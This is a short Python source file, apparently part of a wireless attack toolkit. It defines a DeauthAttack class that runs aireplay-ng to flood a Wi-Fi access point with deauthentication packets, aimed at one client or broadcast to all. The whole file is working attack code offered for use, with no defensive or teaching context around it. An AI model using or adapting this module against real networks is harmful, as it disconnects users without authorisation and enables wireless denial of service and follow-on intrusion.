#!/usr/bin/env python3
"""
Deauthentication Attack Module
"""
import subprocess
import time

class DeauthAttack:
    def __init__(self):
        self.attack_process = None
        
    def attack(self, interface, bssid, client=None, count=10):
        """Perform deauthentication attack"""
        try:
            if client:
                # Targeted attack on specific client
                cmd = [
                    'aireplay-ng',
                    '-0', str(count),
                    '-a', bssid,
                    '-c', client,
                    interface
                ]
            else:
                # Broadcast attack
                cmd = [
                    'aireplay-ng',
                    '-0', str(count),
                    '-a', bssid,
                    interface
                ]
                
            print(f"\n\033[93m[*] Sending {count} deauth packets...\033[0m")
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            if result.returncode == 0:
                print(f"\033[92m[+] Deauth attack completed\033[0m")
            else:
                print(f"\033[91m[!] Deauth attack failed: {result.stderr}\033[0m")
                
        except Exception as e:
            print(f"\033[91m[!] Error during deauth attack: {e}\033[0m")
